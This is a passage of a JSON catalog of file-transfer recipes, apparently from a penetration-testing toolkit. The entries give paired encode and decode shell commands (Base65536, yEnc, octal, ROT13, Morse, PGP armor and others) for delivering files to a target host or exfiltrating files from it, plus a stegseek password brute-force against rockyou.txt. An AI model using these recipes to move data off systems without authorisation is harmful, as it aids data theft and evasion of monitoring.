        "text": "python3 -c \"import base32768,sys;sys.stdout.write(base32768.encode(open(sys.argv[1],'rb').read()))\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b32768\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base32768,sys;open(sys.argv[2],'wb').write(base32768.decode(open(sys.argv[1],encoding='utf-8').read().strip()))\" \"{remotefile}.b32768\" \"{remotefile}\""
      }
    ],
    "requires": [
      "python3",
      "base32768"
    ],
    "note": {
      "en": "Unicode text encoding for chats and social channels. Requires the base32768 Python module; if pip cannot find it, use Base2048 or Base65536.",
      "ru": "Unicode-кодирование для чатов и соцсетей. Нужен Python-модуль base32768; если pip его не находит, используйте Base2048 или Base65536."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base32768-exfil",
    "title": "Base32768 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "unicode",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base32768,sys;sys.stdout.write(base32768.encode(open(sys.argv[1],'rb').read()))\" \"{remotefile}\" > \"{remotefile}.b32768\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base32768,sys;open(sys.argv[2],'wb').write(base32768.decode(open(sys.argv[1],encoding='utf-8').read().strip()))\" \"{lhostpath}/{file}.b32768\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3",
      "base32768"
    ],
    "note": {
      "en": "Unicode text encoding for chats and social channels. Requires the base32768 Python module; if pip cannot find it, use Base2048 or Base65536.",
      "ru": "Unicode-кодирование для чатов и соцсетей. Нужен Python-модуль base32768; если pip его не находит, используйте Base2048 или Base65536."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base65536-deliver",
    "title": "Base65536 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "unicode",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base65536,sys;sys.stdout.write(base65536.encode(open(sys.argv[1],'rb').read()))\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.b65536\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base65536,sys;open(sys.argv[2],'wb').write(base65536.decode(open(sys.argv[1],encoding='utf-8').read().strip()))\" \"{remotefile}.b65536\" \"{remotefile}\""
      }
    ],
    "requires": [
      "python3",
      "base65536"
    ],
    "note": {
      "en": "Unicode text encoding for chats and social channels; the result contains non-ASCII characters. Encode on LHOST, transfer the .b65536 file, decode on RHOST.",
      "ru": "Unicode-кодирование для чатов и соцсетей; результат содержит не-ASCII символы. Кодируйте на LHOST, передайте файл .b65536 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-base65536-exfil",
    "title": "Base65536 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "unicode",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import base65536,sys;sys.stdout.write(base65536.encode(open(sys.argv[1],'rb').read()))\" \"{remotefile}\" > \"{remotefile}.b65536\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import base65536,sys;open(sys.argv[2],'wb').write(base65536.decode(open(sys.argv[1],encoding='utf-8').read().strip()))\" \"{lhostpath}/{file}.b65536\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3",
      "base65536"
    ],
    "note": {
      "en": "Unicode text encoding for chats and social channels; the result contains non-ASCII characters. Encode on RHOST, transfer the .b65536 file, decode on LHOST.",
      "ru": "Unicode-кодирование для чатов и соцсетей; результат содержит не-ASCII символы. Кодируйте на RHOST, передайте файл .b65536 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-yenc-deliver",
    "title": "yEnc (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "yenc",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import yenc,os,sys;yenc.encode(open(sys.argv[1],'rb'),open(sys.argv[2],'wb'),os.path.getsize(sys.argv[1]))\" \"{lhostpath}/{file}\" \"{lhostpath}/{file}.ye\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import yenc,sys;yenc.decode(open(sys.argv[1],'rb'),open(sys.argv[2],'wb'))\" \"{remotefile}.ye\" \"{remotefile}\""
      }
    ],
    "requires": [
      "python3",
      "yenc"
    ],
    "note": {
      "en": "Compact Usenet-style binary encoding. The PyPI yenc module is old and may not build on modern Python; if unavailable, use the yencode/ydecode CLI.",
      "ru": "Компактное Usenet-кодирование. PyPI-модуль yenc старый и может не собираться на современном Python; если недоступен, используйте CLI yencode/ydecode."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-yenc-exfil",
    "title": "yEnc (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "yenc",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import yenc,os,sys;yenc.encode(open(sys.argv[1],'rb'),open(sys.argv[2],'wb'),os.path.getsize(sys.argv[1]))\" \"{remotefile}\" \"{remotefile}.ye\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import yenc,sys;yenc.decode(open(sys.argv[1],'rb'),open(sys.argv[2],'wb'))\" \"{lhostpath}/{file}.ye\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3",
      "yenc"
    ],
    "note": {
      "en": "Compact Usenet-style binary encoding. The PyPI yenc module is old and may not build on modern Python; if unavailable, use the yencode/ydecode CLI.",
      "ru": "Компактное Usenet-кодирование. PyPI-модуль yenc старый и может не собираться на современном Python; если недоступен, используйте CLI yencode/ydecode."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-octal-deliver",
    "title": "Octal (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "octal",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "od -An -v -to1 \"{lhostpath}/{file}\" | tr -s ' ' '\\n' | grep . > \"{lhostpath}/{file}.oct\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;open(sys.argv[2],'wb').write(bytes(int(x,8) for x in open(sys.argv[1]).read().split()))\" \"{remotefile}.oct\" \"{remotefile}\""
      }
    ],
    "requires": [
      "od",
      "tr",
      "grep",
      "python3"
    ],
    "note": {
      "en": "Octal byte representation; survives channels that mangle punctuation. Encode on LHOST, transfer the .oct file, decode on RHOST.",
      "ru": "Восьмеричное представление байтов; переживает каналы, ломающие пунктуацию. Кодируйте на LHOST, передайте файл .oct и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-octal-exfil",
    "title": "Octal (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "octal",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "od -An -v -to1 \"{remotefile}\" | tr -s ' ' '\\n' | grep . > \"{remotefile}.oct\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;open(sys.argv[2],'wb').write(bytes(int(x,8) for x in open(sys.argv[1]).read().split()))\" \"{lhostpath}/{file}.oct\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "od",
      "tr",
      "grep",
      "python3"
    ],
    "note": {
      "en": "Octal byte representation; survives channels that mangle punctuation. Encode on RHOST, transfer the .oct file, decode on LHOST.",
      "ru": "Восьмеричное представление байтов; переживает каналы, ломающие пунктуацию. Кодируйте на RHOST, передайте файл .oct и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-utf16-deliver",
    "title": "UTF-16LE (deliver)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "text",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "iconv -f UTF-8 -t UTF-16LE \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.utf16\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "iconv -f UTF-16LE -t UTF-8 \"{remotefile}.utf16\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "iconv"
    ],
    "note": {
      "en": "Text transcoding, not encryption; also used before PowerShell -EncodedCommand. Encode on LHOST, transfer the .utf16 file, decode on RHOST.",
      "ru": "Транскодирование текста, не шифрование; также используется перед PowerShell -EncodedCommand. Кодируйте на LHOST, передайте файл .utf16 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-utf16-exfil",
    "title": "UTF-16LE (exfil)",
    "profiles": [
      "core",
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "text",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "iconv -f UTF-8 -t UTF-16LE \"{remotefile}\" > \"{remotefile}.utf16\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "iconv -f UTF-16LE -t UTF-8 \"{lhostpath}/{file}.utf16\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "iconv"
    ],
    "note": {
      "en": "Text transcoding, not encryption; also used before PowerShell -EncodedCommand. Encode on RHOST, transfer the .utf16 file, decode on LHOST.",
      "ru": "Транскодирование текста, не шифрование; также используется перед PowerShell -EncodedCommand. Кодируйте на RHOST, передайте файл .utf16 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-rot13-deliver",
    "title": "ROT13 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "classic",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "tr 'A-Za-z' 'N-ZA-Mn-za-m' < \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.rot13\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "tr 'A-Za-z' 'N-ZA-Mn-za-m' < \"{remotefile}.rot13\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "tr"
    ],
    "note": {
      "en": "Self-reversible Latin-letter substitution; obfuscation only, text files. Encode on LHOST, transfer the .rot13 file, decode on RHOST.",
      "ru": "Самообратное замещение латинских букв; только обфускация, текстовые файлы. Кодируйте на LHOST, передайте файл .rot13 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-rot13-exfil",
    "title": "ROT13 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "classic",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "tr 'A-Za-z' 'N-ZA-Mn-za-m' < \"{remotefile}\" > \"{remotefile}.rot13\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "tr 'A-Za-z' 'N-ZA-Mn-za-m' < \"{lhostpath}/{file}.rot13\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "tr"
    ],
    "note": {
      "en": "Self-reversible Latin-letter substitution; obfuscation only, text files. Encode on RHOST, transfer the .rot13 file, decode on LHOST.",
      "ru": "Самообратное замещение латинских букв; только обфускация, текстовые файлы. Кодируйте на RHOST, передайте файл .rot13 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-rot47-deliver",
    "title": "ROT47 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "classic",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "tr '!-~' 'P-~!-O' < \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.rot47\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "tr '!-~' 'P-~!-O' < \"{remotefile}.rot47\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "tr"
    ],
    "note": {
      "en": "Self-reversible rotation over printable ASCII; obfuscation only, text files. Encode on LHOST, transfer the .rot47 file, decode on RHOST.",
      "ru": "Самообратный сдвиг printable ASCII; только обфускация, текстовые файлы. Кодируйте на LHOST, передайте файл .rot47 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-rot47-exfil",
    "title": "ROT47 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "classic",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "tr '!-~' 'P-~!-O' < \"{remotefile}\" > \"{remotefile}.rot47\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "tr '!-~' 'P-~!-O' < \"{lhostpath}/{file}.rot47\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "tr"
    ],
    "note": {
      "en": "Self-reversible rotation over printable ASCII; obfuscation only, text files. Encode on RHOST, transfer the .rot47 file, decode on LHOST.",
      "ru": "Самообратный сдвиг printable ASCII; только обфускация, текстовые файлы. Кодируйте на RHOST, передайте файл .rot47 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-atbash-deliver",
    "title": "Atbash (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "classic",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "tr 'A-Za-z' 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba' < \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.atbash\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "tr 'A-Za-z' 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba' < \"{remotefile}.atbash\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "tr"
    ],
    "note": {
      "en": "Classical A<->Z substitution; obfuscation only, text files. Encode on LHOST, transfer the .atbash file, decode on RHOST.",
      "ru": "Классическая замена A<->Z; только обфускация, текстовые файлы. Кодируйте на LHOST, передайте файл .atbash и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-atbash-exfil",
    "title": "Atbash (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "classic",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "tr 'A-Za-z' 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba' < \"{remotefile}\" > \"{remotefile}.atbash\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "tr 'A-Za-z' 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba' < \"{lhostpath}/{file}.atbash\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "tr"
    ],
    "note": {
      "en": "Classical A<->Z substitution; obfuscation only, text files. Encode on RHOST, transfer the .atbash file, decode on LHOST.",
      "ru": "Классическая замена A<->Z; только обфускация, текстовые файлы. Кодируйте на RHOST, передайте файл .atbash и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-caesar3-deliver",
    "title": "Caesar +3 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "classic",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "tr 'A-Za-z' 'D-ZA-Cd-za-c' < \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.caesar3\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "tr 'D-ZA-Cd-za-c' 'A-Za-z' < \"{remotefile}.caesar3\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "tr"
    ],
    "note": {
      "en": "Classical Caesar shift by 3; obfuscation only, text files. Encode on LHOST, transfer the .caesar3 file, decode on RHOST.",
      "ru": "Классический сдвиг Цезаря на 3; только обфускация, текстовые файлы. Кодируйте на LHOST, передайте файл .caesar3 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-caesar3-exfil",
    "title": "Caesar +3 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "classic",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "tr 'A-Za-z' 'D-ZA-Cd-za-c' < \"{remotefile}\" > \"{remotefile}.caesar3\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "tr 'D-ZA-Cd-za-c' 'A-Za-z' < \"{lhostpath}/{file}.caesar3\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "tr"
    ],
    "note": {
      "en": "Classical Caesar shift by 3; obfuscation only, text files. Encode on RHOST, transfer the .caesar3 file, decode on LHOST.",
      "ru": "Классический сдвиг Цезаря на 3; только обфускация, текстовые файлы. Кодируйте на RHOST, передайте файл .caesar3 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-morse-deliver",
    "title": "Morse (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "numeric",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import morse_talk as m,sys;sys.stdout.write(m.encode(open(sys.argv[1]).read()))\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.morse\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import morse_talk as m,sys;sys.stdout.write(m.decode(open(sys.argv[1]).read()))\" \"{remotefile}.morse\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "python3",
      "morse_talk"
    ],
    "note": {
      "en": "Text-only Morse representation; needs morse-talk. Encode on LHOST, transfer the .morse file, decode on RHOST.",
      "ru": "Текстовое представление Морзе; нужен morse-talk. Кодируйте на LHOST, передайте файл .morse и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-morse-exfil",
    "title": "Morse (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "numeric",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import morse_talk as m,sys;sys.stdout.write(m.encode(open(sys.argv[1]).read()))\" \"{remotefile}\" > \"{remotefile}.morse\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import morse_talk as m,sys;sys.stdout.write(m.decode(open(sys.argv[1]).read()))\" \"{lhostpath}/{file}.morse\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3",
      "morse_talk"
    ],
    "note": {
      "en": "Text-only Morse representation; needs morse-talk. Encode on RHOST, transfer the .morse file, decode on LHOST.",
      "ru": "Текстовое представление Морзе; нужен morse-talk. Кодируйте на RHOST, передайте файл .morse и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-a1z26-deliver",
    "title": "A1Z26 (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "numeric",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;t=open(sys.argv[1]).read().upper();sys.stdout.write(' '.join(str(ord(c)-64) for c in t if 'A'<=c<='Z'))\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.a1z26\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;t=open(sys.argv[1]).read().split();sys.stdout.write(''.join(chr(int(x)+64) for x in t))\" \"{remotefile}.a1z26\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Letters A=1..Z=26; text-only, non-letters are dropped. Encode on LHOST, transfer the .a1z26 file, decode on RHOST.",
      "ru": "Буквы A=1..Z=26; только текст, не-буквы отбрасываются. Кодируйте на LHOST, передайте файл .a1z26 и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-a1z26-exfil",
    "title": "A1Z26 (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "numeric",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;t=open(sys.argv[1]).read().upper();sys.stdout.write(' '.join(str(ord(c)-64) for c in t if 'A'<=c<='Z'))\" \"{remotefile}\" > \"{remotefile}.a1z26\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;t=open(sys.argv[1]).read().split();sys.stdout.write(''.join(chr(int(x)+64) for x in t))\" \"{lhostpath}/{file}.a1z26\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Letters A=1..Z=26; text-only, non-letters are dropped. Encode on RHOST, transfer the .a1z26 file, decode on LHOST.",
      "ru": "Буквы A=1..Z=26; только текст, не-буквы отбрасываются. Кодируйте на RHOST, передайте файл .a1z26 и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-binary-deliver",
    "title": "Binary (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "numeric",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;d=open(sys.argv[1],'rb').read();sys.stdout.write(' '.join(format(b,'08b') for b in d))\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.bin\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;d=open(sys.argv[1]).read().split();open(sys.argv[2],'wb').write(bytes(int(x,2) for x in d))\" \"{remotefile}.bin\" \"{remotefile}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Bytes as 8-bit binary groups; large but explicit. Encode on LHOST, transfer the .bin file, decode on RHOST.",
      "ru": "Байты в виде 8-битных групп; объёмно, но наглядно. Кодируйте на LHOST, передайте файл .bin и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-binary-exfil",
    "title": "Binary (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "numeric",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;d=open(sys.argv[1],'rb').read();sys.stdout.write(' '.join(format(b,'08b') for b in d))\" \"{remotefile}\" > \"{remotefile}.bin\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;d=open(sys.argv[1]).read().split();open(sys.argv[2],'wb').write(bytes(int(x,2) for x in d))\" \"{lhostpath}/{file}.bin\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Bytes as 8-bit binary groups; large but explicit. Encode on RHOST, transfer the .bin file, decode on LHOST.",
      "ru": "Байты в виде 8-битных групп; объёмно, но наглядно. Кодируйте на RHOST, передайте файл .bin и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-decimal-deliver",
    "title": "Decimal (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "numeric",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;d=open(sys.argv[1],'rb').read();sys.stdout.write(' '.join(str(b) for b in d))\" \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.dec\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;d=open(sys.argv[1]).read().split();open(sys.argv[2],'wb').write(bytes(int(x) for x in d))\" \"{remotefile}.dec\" \"{remotefile}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Bytes as decimal numbers; easy to dictate over voice or text. Encode on LHOST, transfer the .dec file, decode on RHOST.",
      "ru": "Байты в виде десятичных чисел; удобно диктовать голосом или текстом. Кодируйте на LHOST, передайте файл .dec и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-decimal-exfil",
    "title": "Decimal (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "numeric",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;d=open(sys.argv[1],'rb').read();sys.stdout.write(' '.join(str(b) for b in d))\" \"{remotefile}\" > \"{remotefile}.dec\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "python3 -c \"import sys;d=open(sys.argv[1]).read().split();open(sys.argv[2],'wb').write(bytes(int(x) for x in d))\" \"{lhostpath}/{file}.dec\" \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "python3"
    ],
    "note": {
      "en": "Bytes as decimal numbers; easy to dictate over voice or text. Encode on RHOST, transfer the .dec file, decode on LHOST.",
      "ru": "Байты в виде десятичных чисел; удобно диктовать голосом или текстом. Кодируйте на RHOST, передайте файл .dec и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-pgp-armor-deliver",
    "title": "PGP ASCII armor (deliver)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "encoding",
    "family": "pgp",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "gpg --enarmor < \"{lhostpath}/{file}\" > \"{lhostpath}/{file}.asc\""
      },
      {
        "side": "rhost",
        "shell": "bash",
        "text": "gpg --dearmor < \"{remotefile}.asc\" > \"{remotefile}\""
      }
    ],
    "requires": [
      "gpg"
    ],
    "note": {
      "en": "ASCII armor for binary data; no encryption by itself. Encode on LHOST, transfer the .asc file, decode on RHOST.",
      "ru": "ASCII-armor для бинарных данных; сам по себе не шифрует. Кодируйте на LHOST, передайте файл .asc и декодируйте на RHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "enc-pgp-armor-exfil",
    "title": "PGP ASCII armor (exfil)",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "encoding",
    "family": "pgp",
    "priority": 10,
    "source": "10",
    "steps": [
      {
        "side": "rhost",
        "shell": "bash",
        "text": "gpg --enarmor < \"{remotefile}\" > \"{remotefile}.asc\""
      },
      {
        "side": "lhost",
        "shell": "bash",
        "text": "gpg --dearmor < \"{lhostpath}/{file}.asc\" > \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "gpg"
    ],
    "note": {
      "en": "ASCII armor for binary data; no encryption by itself. Encode on RHOST, transfer the .asc file, decode on LHOST.",
      "ru": "ASCII-armor для бинарных данных; сам по себе не шифрует. Кодируйте на RHOST, передайте файл .asc и декодируйте на LHOST."
    },
    "docs": "docs/en/10-encoding.md"
  },
  {
    "id": "steg-seek-seed",
    "title": "stegseek detect",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "deliver",
    "channel": "stegano",
    "family": "stegseek",
    "priority": 10,
    "source": "13",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "stegseek --seed \"{lhostpath}/{file}\""
      }
    ],
    "requires": [
      "stegseek"
    ],
    "note": {
      "en": "Checks whether a JPEG/BMP/WAV carries steghide data. Point File at the stego carrier on LHOST.",
      "ru": "Проверяет, есть ли в JPEG/BMP/WAV данные steghide. Укажите в File stego-носитель на LHOST."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-seek-crack",
    "title": "stegseek crack",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
    "direction": "exfil",
    "channel": "stegano",
    "family": "stegseek",
    "priority": 10,
    "source": "13",
    "steps": [
      {
        "side": "lhost",
        "shell": "bash",
        "text": "stegseek \"{lhostpath}/{file}\" /usr/share/wordlists/rockyou.txt -xf \"{lhostpath}/{file}.out\""
      }
    ],
    "requires": [
      "stegseek",
      "rockyou.txt"
    ],
    "note": {
      "en": "Brute-forces the steghide password and extracts the payload to {file}.out.",
      "ru": "Брутфорсит пароль steghide и извлекает payload в {file}.out."
    },
    "docs": "docs/en/13-stegano.md"
  },
  {
    "id": "steg-mp4-attach",
    "title": "MP4 attachment",
    "profiles": [
      "exotic"
    ],
    "os": "linux",
